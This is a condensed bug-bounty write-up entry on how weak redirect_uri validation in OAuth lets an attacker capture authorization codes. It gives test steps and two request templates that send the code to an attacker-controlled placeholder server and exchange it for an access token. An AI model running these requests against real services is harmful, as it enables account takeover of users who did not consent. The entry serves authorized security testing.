---
id: fb9b91a09fba
title: "Why Open Redirects Become Critical Inside OAuth"
source_url: https://kd-200.medium.com/why-open-redirects-become-critical-inside-oauth-35261b5d8b85
author: "Nitin yadav"
publication_date: 2026-08-17
category: oauth-sso
category_label: "OAuth / SSO"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "cybersecurity"
  - "bug-bounty"
  - "ethical-hacking"
  - "infosec"
  - "hacking"
tools:
  []
quick_test: "Test if the redirect_uri parameter in OAuth flows allows for manipulation to an external domain."
---

## Use case

The article discusses how open redirects in OAuth flows can lead to account takeover by allowing attackers to manipulate the redirect_uri parameter. This misconfiguration can expose users to significant security risks if not properly validated.

## Steps to test

1. Identify an OAuth implementation that uses redirect_uri for authorization.
2. Initiate the OAuth flow by sending a request to the authorization endpoint with a valid client_id and a legitimate redirect_uri.
3. Observe the response and note the redirect_uri used.
4. Tamper with the redirect_uri parameter by modifying it to point to your controlled server.
5. Complete the OAuth flow and capture the authorization code sent to your server.
6. Exchange the captured authorization code for an access token using the client’s server.

## Commands

```text
GET https://provider.com/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=https://your-controlled-server.com/callback&response_type=code&state=STATE_VALUE
POST https://client-server.com/token -d 'code=CAPTURED_AUTH_CODE&client_id=YOUR_CLIENT_ID&client_secret=YOUR_CLIENT_SECRET&redirect_uri=https://your-controlled-server.com/callback'
```

## Source

- Author: Nitin yadav
- Writeup: https://kd-200.medium.com/why-open-redirects-become-critical-inside-oauth-35261b5d8b85

_For authorized testing only. Credit the original author._
